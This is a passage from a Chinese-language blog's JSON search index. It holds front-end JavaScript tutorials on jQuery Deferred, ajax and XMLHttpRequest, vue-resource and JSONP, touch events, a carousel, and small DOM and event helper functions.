function(dtd){ var tasks = function(){ alert(“执行完毕！”); dtd.resolve(); // 改变deferred对象的执行状态 }; setTimeout(tasks,5000); return dtd; }; 现在，wait()函数返回的是deferred对象，这就可以加上链式操作了。 $.when(wait(dtd)) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例6） wait()函数运行完，就会自动运行done()方法指定的回调函数。 六、deferred.resolve()方法和deferred.reject()方法 如果仔细看，你会发现在上面的wait()函数中，还有一个地方我没讲解。那就是dtd.resolve()的作用是什么？ 要说清楚这个问题，就要引入一个新概念”执行状态”。jQuery规定，deferred对象有三种执行状态—-未完成，已完成和已失败。如果执行状态是”已完成”（resolved）,deferred对象立刻调用done()方法指定的回调函数；如果执行状态是”已失败”，调用fail()方法指定的回调函数；如果执行状态是”未完成”，则继续等待，或者调用progress()方法指定的回调函数（jQuery1.7版本添加）。 前面部分的ajax操作时，deferred对象会根据返回结果，自动改变自身的执行状态；但是，在wait()函数中，这个执行状态必须由程序员手动指定。dtd.resolve()的意思是，将dtd对象的执行状态从”未完成”改为”已完成”，从而触发done()方法。 类似的，还存在一个deferred.reject()方法，作用是将dtd对象的执行状态从”未完成”改为”已失败”，从而触发fail()方法。 var dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd){ var tasks = function(){ alert(“执行完毕！”); dtd.reject(); // 改变Deferred对象的执行状态 }; setTimeout(tasks,5000); return dtd; }; $.when(wait(dtd)) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例7） 七、deferred.promise()方法 上面这种写法，还是有问题。那就是dtd是一个全局对象，所以它的执行状态可以从外部改变。 请看下面的代码： var dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd){ var tasks = function(){ alert(“执行完毕！”); dtd.resolve(); // 改变Deferred对象的执行状态 }; setTimeout(tasks,5000); return dtd; }; $.when(wait(dtd)) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); dtd.resolve(); （运行代码示例8） 我在代码的尾部加了一行dtd.resolve()，这就改变了dtd对象的执行状态，因此导致done()方法立刻执行，跳出”哈哈，成功了！”的提示框，等5秒之后再跳出”执行完毕！”的提示框。 为了避免这种情况，jQuery提供了deferred.promise()方法。它的作用是，在原来的deferred对象上返回另一个deferred对象，后者只开放与改变执行状态无关的方法（比如done()方法和fail()方法），屏蔽与改变执行状态有关的方法（比如resolve()方法和reject()方法），从而使得执行状态不能被改变。 请看下面的代码： var dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd){ var tasks = function(){ alert(“执行完毕！”); dtd.resolve(); // 改变Deferred对象的执行状态 }; setTimeout(tasks,5000); return dtd.promise(); // 返回promise对象 }; var d = wait(dtd); // 新建一个d对象，改为对这个对象进行操作 $.when(d) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); d.resolve(); // 此时，这个语句是无效的 （运行代码示例9） 在上面的这段代码中，wait()函数返回的是promise对象。然后，我们把回调函数绑定在这个对象上面，而不是原来的deferred对象上面。这样的好处是，无法改变这个对象的执行状态，要想改变执行状态，只能操作原来的deferred对象。 不过，更好的写法是allenm所指出的，将dtd对象变成wait(）函数的内部对象。 var wait = function(dtd){ var dtd = $.Deferred(); //在函数内部，新建一个Deferred对象 var tasks = function(){ alert(“执行完毕！”); dtd.resolve(); // 改变Deferred对象的执行状态 }; setTimeout(tasks,5000); return dtd.promise(); // 返回promise对象 }; $.when(wait()) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例10） 八、普通操作的回调函数接口（中） 另一种防止执行状态被外部改变的方法，是使用deferred对象的建构函数$.Deferred()。 这时，wait函数还是保持不变，我们直接把它传入$.Deferred()： $.Deferred(wait) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例11） jQuery规定，$.Deferred()可以接受一个函数名（注意，是函数名）作为参数，$.Deferred()所生成的deferred对象将作为这个函数的默认参数。 九、普通操作的回调函数接口（下） 除了上面两种方法以外，我们还可以直接在wait对象上部署deferred接口。 var dtd = $.Deferred(); // 生成Deferred对象 var wait = function(dtd){ var tasks = function(){ alert(“执行完毕！”); dtd.resolve(); // 改变Deferred对象的执行状态 }; setTimeout(tasks,5000); }; dtd.promise(wait); wait.done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); wait(dtd); （运行代码示例12） 这里的关键是dtd.promise(wait)这一行，它的作用就是在wait对象上部署Deferred接口。正是因为有了这一行，后面才能直接在wait上面调用done()和fail()。 十、小结：deferred对象的方法 前面已经讲到了deferred对象的多种方法，下面做一个总结： （1） $.Deferred() 生成一个deferred对象。 （2） deferred.done() 指定操作成功时的回调函数 （3） deferred.fail() 指定操作失败时的回调函数 （4） deferred.promise() 没有参数时，返回一个新的deferred对象，该对象的运行状态无法被改变；接受参数时，作用为在参数对象上部署deferred接口。 （5） deferred.resolve() 手动改变deferred对象的运行状态为”已完成”，从而立即触发done()方法。 （6）deferred.reject() 这个方法与deferred.resolve()正好相反，调用后将deferred对象的运行状态变为”已失败”，从而立即触发fail()方法。 （7） $.when() 为多个操作指定回调函数。 除了这些方法以外，deferred对象还有二个重要方法，上面的教程中没有涉及到。 （8）deferred.then() 有时为了省事，可以把done()和fail()合在一起写，这就是then()方法。 $.when($.ajax( “/main.php” )) .then(successFunc, failureFunc ); 如果then()有两个参数，那么第一个参数是done()方法的回调函数，第二个参数是fail()方法的回调方法。如果then()只有一个参数，那么等同于done()。 （9）deferred.always() 这个方法也是用来指定回调函数的，它的作用是，不管调用的是deferred.resolve()还是deferred.reject()，最后总是执行。 $.ajax( “test.html” ) .always( function() { alert(“已执行！”);} ); 本文转载自http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"},{"name":"jQuery","slug":"jQuery","permalink":"http://www.wanyifeng.top/tags/jQuery/"}]},{"title":"前端实现长链接","date":"2015-07-05T10:13:21.000Z","path":"2015/07/05/前端实现长链接/","text":"可以不必设置客户端ajax的超时时间，但进行请求的时候传递一个超时值给服务器，服务器在处理的时候，如果超时时间到了的话，还没有客户端需要的结果，这时传递一个超时信息给客户端，客户端接收到了此信息，根据情况重新进行ajax请求 1234567891011(function() &#123; function getData() &#123; $.ajax(&#123; type: \"POST\", url: \"后台URL\", dataType: \"json\", timeout: 60000, //延迟 data: &#123; userName: \"\" &#125;, success: function(data) &#123; if(data.success==\"1\")&#123; //获取到数据后的逻辑 //... ///重新请求 getData() //重新调用 } data.success==&quot;0&quot; &amp;&amp; (getData())// 超时 重新调用 }, error: function(XMLHttpRequest, textStatus, errorThrown) { //请求错误打印错误重新调用 alert(&quot;error:&quot; + textStatus); getData() } }); } })() `","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"}]},{"title":"ajax原生 ajax jQuery","date":"2015-06-05T03:13:01.000Z","path":"2015/06/05/ajax入门学习笔记/","text":"ajax五部曲12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 绑定点击事件` document.querySelector('#ajaxGet').onclick = function ()&#123; // 通过 ajax 发送数据 给服务器 // ajax 五部 // 1.创建对象 var ajax = new XMLHttpRequest(); // 2.设置请求的方法 以及 请求的 url // get提交的数据 是在哪? // ajax中 通过 get发送数据 需要手动 拼接数据 // xxx.php?userName=fox&amp;userFood=fox&amp;userWife=贝贝 ajax.open('get','01.ajaxGetData.php?userName=jack&amp;friend=iceMountain'); // 3.发送数据 ajax.send(); // 4.注册事件 onload事件 ajax.onreadystatechange = function()&#123; // 5.获取返回的数据 并使用 if(ajax.readyState == 4 &amp;&amp; ajax.status == 200)&#123;0 console.log(ajax.responseType); //在这里可以传入回调函数 &#125; &#125; &#125; // 经典写法 function ajax() &#123; //先声明一个异步请求对象 var xmlHttpReg = null; if (window.ActiveXObject) &#123;//如果是IE xmlHttpReg = new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125; else if (window.XMLHttpRequest) &#123; xmlHttpReg = new XMLHttpRequest(); //实例化一个xmlHttpReg &#125; //如果实例化成功,就调用open()方法,就开始准备向服务器发送请求 if (xmlHttpReg != null) &#123; xmlHttpReg.open(\"get\", \"About.aspx\", true);1 xmlHttpReg.send(null); xmlHttpReg.onreadystatechange = doResult; //设置回调函数 &#125; //回调函数 //一旦readyState的值改变,将会调用这个函数,readyState=4表示完成相应 //设定函数doResult() function doResult() &#123; if (xmlHttpReg.readyState == 4) &#123;//4代表执行完成 if (xmlHttpReg.status == 200) &#123;//200代表执行成功 //将xmlHttpReg.responseText的值赋给ID为resText的元素 document.getElementById(\"resText\").innerHTML = xmlHttpReg.responseText &#125; &#125; &#125; &#125; open(method,url,async) 规定请求的类型、URL 以及是否异步处理请求。method：请求的类型；GET 或 POSTurl：文件在服务器上的位置async：true（异步）或 false（同步） send(string) 将请求发送到服务器。string：仅用于 POST 请求 onreadystatechange 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。 readyState 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。0: 请求未初始化1: 服务器连接已建立2: 请求已接收3: 请求处理中4: 请求已完成，且响应已就绪 status 200: “OK”404: 未找到页面 ajax报文请求报文 请求行 请求的地址 请求的方法 请求头 浏览器的一些信息 或者是我们想要告诉服务器的信息 请求主体 一般是发送的数据 响应报文 状态行 请求成功与否? 响应头 服务器发送过来的一些信息 响应主体 12返回的内容如果是php 那么是执行的结果 提交方式get数据在URL中 本身对数据大小没有限制 浏览器对于url的长度 做了限制 12xmlhttp.open(\"GET\",\"/try/ajax/demo_get.php\",true);xmlhttp.send(); 在上面的例子中，您可能得到的是缓存的结果。为了避免这种情况，请向 URL 添加一个唯一的 ID： 12xmlhttp.open(\"GET\",\"/try/ajax/demo_get.php?t=\" + Math.random(),true);xmlhttp.send(); post安全只是提高了一丢丢 因为 在抓包工具 或者是浏览器自身的 监控工具中 都是能够直接查看的 post对于提交文件的大小没有限制 浏览器端 服务端一般会做限制 php默认是约束了文件的上传大小的 浏览器端 服务端一般会做限制 与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。 123xmlhttp.open(\"POST\",\"/try/ajax/demo_post2.php\",true);xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");//添加头xmlhttp.send(\"fname=Henry&amp;lname=Ford\"); 使用get还是post然而，在以下情况中，请使用 POST 请求： 无法使用缓存文件（更新服务器上的文件或数据库） 向服务器发送大量数据（POST 没有数据量限制） 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠 jq的ajax get的方式 12345$(\"#get\").click(function()&#123; $.get(\"01.jqAjaxMore.php\",\"name=jack$wife=reos\",function(data)&#123; console.log(data); &#125;)&#125;) post的方式 12345$(\"#post\").click(function()&#123; $.post(\"01.jqAjaxMore.php\",\"name=jack&amp;age=12\",function(data)&#123; console.log(data); &#125;)&#125;) 复合的方式 1234567891011121314151617181920212223242526272829$(\"#ajax\").click(function()&#123; $.ajax(&#123; type:\"post\", url:\"01.jqAjaxMore.php\", async:true, dataType :\"json\", data:&#123; name:\"jack\", age:12, gender:1 &#125;, success:function(data)&#123; console.log(data); &#125;, beforeSend:function()&#123; console.log(this); //为ajax的对象 console.log(this.data); //name=jack&amp;age=12&amp;gender=1 字符串形式传递 if (this.data.name == \"jack\") &#123; console.log(\"aa\"); return false; &#125; &#125;, complete:function()&#123; //在请求完成时,会调用 &#125; &#125;);&#125;); 注意 jq的ajax的dataType属性不能在服务器返回字符串的时候使用 JSON 序列化JSON.stringify作用：将一个 JavaScript 对象转为标准的 json 格式字符串 1234567var user = &#123; name: 'Jack', age: 18, gender: '男'&#125;JSON.stringify(user) // =&gt; &#123;\"name\":\"Jack\",\"age\":18,\"gender\":\"男\"&#125; JSON.parse作用：将一个标准的 json 格式字符串转为一个 JavaScript 对象 1234567var userStr = \"&#123;\"name\":\"Jack\",\"age\":18,\"gender\":\"男\"&#125;\"&#123; name: 'Jack', age: 18, gender: '男'&#125; 将对象转为 json 格式字符串叫做序列化，将 json 格式字符串转为对象叫做反序列化。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"}]},{"title":"Vue-resource","date":"2015-06-05T03:13:01.000Z","path":"2015/06/05/vue-resource/","text":"POST请求12345678getData()&#123; const url = \"http://127.0.0.1:3000/postLogin\"; this.$http.post(url,&#123;username: 'lisi',password:'lisi3'&#125;,&#123;emulateJSON:true&#125;).then(res=&gt;&#123; console.log(res.body); &#125;,err=&gt;&#123; console.log('请求失败'); &#125;) &#125; GET请求12345678getData()&#123; const url = \"http://127.0.0.1:3000/login?username=zhangsan&amp;password=1233\"; this.$http.get(url).then(res=&gt;&#123; console.log(res.body); &#125;,err=&gt;&#123; console.log('请求失败'); &#125;)&#125; JSONP请求12345678getData()&#123; const url = \"http://127.0.0.1:3000/jsonpLogin?username=zhangsan&amp;password=123\"; this.$http.jsonp(url).then(res=&gt;&#123; console.log(res.body); &#125;,err=&gt;&#123; console.log('请求失败'); &#125;) &#125; 注意JSONP请求需要服务端支持 NODEJS支持代码设定 1234567891011//2.0 将所有api的请求响应content-type设置为application/jsonapp.all('/api/*',(req,res,next)=&gt;&#123; //设置允许跨域响应报文头 //设置跨域 res.header(\"Access-Control-Allow-Origin\", \"*\"); res.header(\"Access-Control-Allow-Headers\", \"X-Requested-With\"); res.header(\"Access-Control-Allow-Methods\",\"*\"); res.setHeader('Content-Type','application/json;charset=utf-8'); next();&#125;); 12345678910111213route.all('/api/jsonp',(req,res)=&gt;&#123; var callbackFn = req.query.callback; var obj = &#123;message:'jsonp 请求 ok'&#125;; var jsonStr = JSON.stringify(obj); res.end(`$&#123;callbackFn&#125;('$&#123;jsonStr&#125;')`);&#125;);module.exports = route 注意需要 基于 express 在实现","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"原生js的触摸事件","date":"2015-05-18T02:04:04.000Z","path":"2015/05/18/移动端touch事件/","text":"1234567891011121314151617181920212223var setid = setid;var clien;//按下去获取位置var tmp = false;var move_touch;//touchstart //滑动开始事件//移动的距离 img_obj.addEventListener(\"touchstart\", function(e) &#123; clien = e.changedTouches[0].clientX;&#125;, false);// touchsmove //滑动事件img_obj.addEventListener(\"touchmove\", function(e) &#123; tmp = true; move_touch = e.changedTouches[0].clientX;&#125;, false);// touchend //滑动结束事件img_obj.addEventListener(\"touchend\", function(e) &#123; if(tmp &amp;&amp; (Math.abs(move_touch - clien)) &gt; w / 3) &#123; //滑动距离超过3/1 //js code---- &#125; tmp = false; clien = 0; move_touch = 0;&#125;, false); 当开始一个touchstart事件的时候，获取此刻手指的横坐标startX和纵坐标startY； 当触发touchmove事件时，在获取此时手指的横坐标moveEndX和纵坐标moveEndY; 最后，通过touchend 计算这两次获取的坐标差值来判断手指在手机屏幕上的滑动方向。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"js的JSON解析","date":"2015-05-05T03:58:21.000Z","path":"2015/05/05/js的json解析/","text":"JavaScript JSON JSON 是用于存储和传输数据的格式。 JSON 通常用于服务端向网页传递数据 。 什么是 JSON? JSON 英文全称 JavaScript Object Notation JSON 是一种轻量级的数据交换格式。 JSON是独立的语言 * JSON 易于理解。 JSON 实例以下 JSON 语法定义了 sites 对象: 3 条网站信息（对象）的数组: 12345&#123;\"sites\":[ &#123;\"name\":\"Runoob\", \"url\":\"www.runoob.com\"&#125;, &#123;\"name\":\"Google\", \"url\":\"www.google.com\"&#125;, &#123;\"name\":\"Taobao\", \"url\":\"www.taobao.com\"&#125;]&#125; JSON 格式化后为 JavaScript 对象JSON 格式在语法上与创建 JavaScript 对象代码是相同的。 由于它们很相似，所以 JavaScript 程序可以很容易的将 JSON 数据转换为 JavaScript 对象。 JSON 语法规则 数据为 键/值 对。 数据由逗号分隔。 大括号保存对象 方括号保存数组 JSON 数据 - 一个名称对应一个值JSON 数据格式为 键/值 对，就像 JavaScript 对象属性。 键/值对包括字段名称（在双引号中），后面一个冒号，然后是值： “name”:”Runoob” JSON 对象JSON 对象保存在大括号内。 就像在 JavaScript 中, 对象可以保存多个 键/值 对： 1&#123;\"name\":\"Runoob\", \"url\":\"www.runoob.com\"&#125; JSON 数组JSON 数组保存在中括号内。 就像在 JavaScript 中, 数组可以包含对象：12345\"sites\":[ &#123;\"name\":\"Runoob\", \"url\":\"www.runoob.com\"&#125;, &#123;\"name\":\"Google\", \"url\":\"www.google.com\"&#125;, &#123;\"name\":\"Taobao\", \"url\":\"www.taobao.com\"&#125;] 在以上实例中，对象 “sites” 是一个数组，包含了三个对象。 每个对象为站点的信息（网站名和网站地址）。 JSON 字符串转换为 JavaScript 对象通常我们从服务器中读取 JSON 数据，并在网页中显示数据。 简单起见，我们网页中直接设置 JSON 字符串 (你还可以阅读我们的 JSON 教程): 首先，创建 JavaScript 字符串，字符\b串为 JSON 格式的数据： 1234var text = '&#123; \"sites\" : [' +'&#123; \"name\":\"Runoob\" , \"url\":\"www.runoob.com\" &#125;,' +'&#123; \"name\":\"Google\" , \"url\":\"www.google.com\" &#125;,' +'&#123; \"name\":\"Taobao\" , \"url\":\"www.taobao.com\" &#125; ]&#125;'; 然后，使用 JavaScript 内置函数 JSON.parse() 将字符串转换为 JavaScript 对象: 1var obj = JSON.parse(text); ##JSON 字符串转换为 JavaScript 对象 把JavaScript对象转化为字符串 12345var text = '&#123; \"sites\" : [ &#123; \"name\":\"Runoob\" , \"url\":\"www.runoob.com\" &#125;, &#123; \"name\":\"Google\" , \"url\":\"www.google.com\" &#125;, &#123; \"name\":\"Taobao\" , \"url\":\"www.taobao.com\" &#125; ]&#125;'; 然后，使用 JavaScript 内置函数 JSON.stringify() 将JavaScript 对象转换为字符串","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"轮播图简单实现","date":"2015-04-18T03:33:21.000Z","path":"2015/04/18/js轮播图原理/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;script&gt; function my$(id) &#123; return document.getElementById(id); &#125; var box = my$(\"box\"); var inner = box.children[0].offsetWidth; var ol = box.children[0].children[1]; var ul = box.children[0].children[0]; var li = ul.children; var pic = 0; var arr = my$(\"arr\"); var left = my$(\"left\"); var right = my$(\"right\"); var setid = setInterval(f1, 2000); for(var i = 0; i &lt; li.length; i++) &#123; var liObj = document.createElement(\"li\"); liObj.setAttribute(\"index\", i); liObj.innerHTML = i + 1; liObj.onmouseover = function() &#123; //排他 for(var i = 0; i &lt; ol.children.length; i++) &#123; ol.children[i].removeAttribute(\"class\"); &#125; this.className = \"current\"; pic = this.getAttribute(\"index\"); animate(ul, -pic * inner); &#125; ol.appendChild(liObj); &#125; ol.children[0].className = \"current\"; ul.appendChild(ul.children[0].cloneNode(true)); box.onmouseover = function() &#123; arr.style.display = \"block\"; clearInterval(setid); &#125; box.onmouseout = function() &#123; arr.style.display = \"none\"; setid = setInterval(f1, 2000); &#125; left.onclick = function() &#123; if(pic == 0) &#123; pic = li.length - 1; ul.style.left = -pic * inner + \"px\"; &#125; pic--; animate(ul, -pic * inner); for(var i = 0; i &lt; ol.children.length; i++) &#123; ol.children[i].removeAttribute(\"class\"); &#125; ol.children[pic].className = \"current\"; &#125; right.onclick = f1; function f1() &#123; if(pic == li.length - 1) &#123; pic = 0; ul.style.left = 0 + \"px\"; &#125; pic++; animate(ul, -pic * inner); if(pic == li.length - 1) &#123; //第一个按钮有颜色 ol.children[0].className = \"current\"; //最后一个按钮颜色移除 ol.children[ol.children.length - 1].removeAttribute(\"class\"); &#125; else &#123; //排他功能 for(var i = 0; i &lt; ol.children.length; i++) &#123; ol.children[i].removeAttribute(\"class\"); &#125; //让点击按钮的时候里面对应的pic对应的按钮有背景颜色 ol.children[pic].className = \"current\"; &#125; &#125;;&lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;style type=\"text/css\"&gt; * &#123; padding: 0; margin: 0; list-style: none; border: 0; &#125; .all &#123; width: 500px; height: 200px; padding: 7px; border: 1px solid #ccc; margin: 100px auto; position: relative; &#125; .screen &#123; width: 500px; height: 200px; overflow: hidden; position: relative; &#125; .screen li &#123; width: 500px; height: 200px; overflow: hidden; float: left; &#125; .screen ul &#123; position: absolute; left: 0; top: 0px; width: 3000px; &#125; .all ol &#123; position: absolute; right: 10px; bottom: 10px; line-height: 20px; text-align: center; &#125; .all ol li &#123; float: left; width: 20px; height: 20px; background: #fff; border: 1px solid #ccc; margin-left: 10px; cursor: pointer; &#125; .all ol li.current &#123; background: yellow; &#125; #arr &#123; display: none; &#125; #arr span &#123; width: 40px; height: 40px; position: absolute; left: 5px; top: 50%; margin-top: -20px; background: #000; cursor: pointer; line-height: 40px; text-align: center; font-weight: bold; font-family: '黑体'; font-size: 30px; color: #fff; opacity: 0.3; border: 1px solid #fff; &#125; #arr #right &#123; right: 5px; left: auto; &#125;&lt;/style&gt; 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"all\" id='box'&gt; &lt;div class=\"screen\"&gt; &lt;ul&gt; &lt;li&gt;&lt;img src=\"images/1.jpg\" width=\"500\" height=\"200\" /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"images/2.jpg\" width=\"500\" height=\"200\" /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"images/3.jpg\" width=\"500\" height=\"200\" /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"images/4.jpg\" width=\"500\" height=\"200\" /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"images/5.jpg\" width=\"500\" height=\"200\" /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;/ol&gt; &lt;/div&gt; &lt;div id=\"arr\"&gt;&lt;span id=\"left\"&gt;&amp;lt;&lt;/span&gt;&lt;span id=\"right\"&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"},{"name":"innerText","slug":"innerText","permalink":"http://www.wanyifeng.top/tags/innerText/"}]},{"title":"注册移除事件兼容代码以及获取事件参数","date":"2015-04-12T02:18:20.000Z","path":"2015/04/12/注册移除事件兼容代码以及获取事件参数/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647var EventTools= &#123; //为对象添加注册事件 addEventListener: function (element, eventName, listener) &#123; if (element.addEventListener) &#123; element.addEventListener(eventName, listener, false); &#125; else if (element.attachEvent) &#123; element.attachEvent(\"on\" + eventName, listener) &#125; else &#123; element[\"on\" + eventName] = listener; &#125; &#125;, //为对象移除事件 removeEventListener: function (element, eventName, listener) &#123; if (element.removeEventListener) &#123; element.removeEventListener(eventName, listener, false); &#125; else if (element.detachEvent) &#123; element.detachEvent(\"on\" + eventName, listener); &#125; else &#123; element[\"on\" + eventName] = null; &#125; &#125;, //获取参数e getEvent: function (e) &#123; return e || window.event; &#125;, getPageX: function (e) &#123; if (e.pageX) &#123; return e.pageX; &#125; else &#123; //有的浏览器把高度设计在了文档的第一个元素中了 //有的浏览器把高度设计在了body中了 //document.documentElement.scrollTop;//文档的第一个元素 //document.body.scrollTop; var scrollLeft = document.documentElement.scrollLeft || document.body.scrollLeft; return e.clientX + scrollLeft; &#125; &#125;, getPageY: function (e) &#123; if (e.pageY) &#123; return e.pageY; &#125; else &#123; var scrollTop = document.documentElement.scrollTop || document.body.scrollTop; return e.clientY + scrollTop; &#125; &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"}]},{"title":"返回时间的轮子","date":"2015-04-07T02:33:21.000Z","path":"2015/04/07/返回时间轮子/","text":"1234567891011121314151617181920212223242526/* * 该函数是返回的是指定格式的日期,是字符串类型 * 参数:date ----日期 * 返回值: 字符串类型的日期 * */function getDatetoString(date) &#123; var strDate;//存储日期的字符串 //获取年 var year=date.getFullYear(); //获取月 var month=date.getMonth()+1; //获取日 var day=date.getDate(); //获取小时 var hour=date.getHours(); //获取分钟 var minute=date.getMinutes() //获取秒 var second=date.getSeconds(); hour=hour&lt;10?\"0\"+hour:hour; minute=minute&lt;10?\"0\"+minute:minute; second=second&lt;10?\"0\"+second:second; //拼接 strDate=year+\"-\"+month+\"-\"+day+\" \"+hour+\":\"+minute+\":\"+second;//隐藏问题,关于变量声明的位置 return strDate;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"获取兄弟元素","date":"2015-04-05T12:25:25.000Z","path":"2015/04/05/获取兄弟元素/","text":"1234567891011121314151617181920//获取兄弟元素function getsiblings(ele) &#123; if(!ele)return;//判断当前的ele这个元素是否存在 var elements=[];//定义数组的目的就是存储当前这个元素的所有的兄弟元素 var el=ele.previousSibling;//当前元素的前一个节点 while (el)&#123; if (el.nodeType===1)&#123;//元素 elements.push(el);//加到数组中 &#125; el=el.previousSibling; &#125; el=ele.nextSibling; while(el)&#123; if(el.nodeType===1)&#123; elements.push(el); &#125; el=el.nextSibling; &#125; return elements;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"}]},{"title":"获取父元素中的最后一个元素","date":"2015-04-05T10:20:25.000Z","path":"2015/04/05/获取父元素中的最后一个元素/","text":"123456789101112//获取父元素中的最后一个元素function getLastElementByParent(parent) &#123; if(parent.lastElementChild)&#123; return parent.lastElementChild; &#125;else&#123; var ele=parent.lastChild; while(ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.previousSibling; &#125; return ele; &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"}]},{"title":"获取父元素中的第一个元素","date":"2015-04-05T06:05:25.000Z","path":"2015/04/05/获取父元素中的第一个元素/","text":"123456789101112//获取父元素中的第一个元素function getFirstElementByParent(parent) &#123; if(parent.firstElementChild)&#123; return parent.firstElementChild; &#125;else&#123; var ele=parent.firstChild; while (ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.nextSibling; &#125; return ele; &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"}]},{"title":"innerText能力检测","date":"2015-03-08T07:33:21.000Z","path":"2015/03/08/innerText能力检测/","text":"12345678910111213/* *设置innerText属性的值 * element-----为某个元素设置属性值 * content-----设置的值 * */function setInnerText(element,content) &#123; if(typeof element.textContent===\"undefined\")&#123; //IE浏览器 element.innerText=content; &#125;else&#123; element.textContent=content; &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"},{"name":"innerText","slug":"innerText","permalink":"http://www.wanyifeng.top/tags/innerText/"}]}]